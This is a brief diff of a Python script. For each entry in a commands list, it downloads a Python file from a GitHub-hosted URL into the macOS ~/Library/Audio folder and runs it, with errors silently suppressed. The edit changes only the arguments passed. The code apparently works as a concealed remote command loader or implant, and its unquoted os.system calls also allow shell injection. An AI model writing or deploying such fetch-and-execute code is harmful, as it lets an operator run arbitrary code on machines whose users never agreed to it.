@@ -22,7 +22,7 @@ for cmd in userData['commands']:
     args = cmd[1:].split(" ")
     try:
         os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{args[0]}.py -o ~/Library/Audio/{args[0]}.py")
-        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args[2:])}")
+        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args)}")
     except:
         pass
 
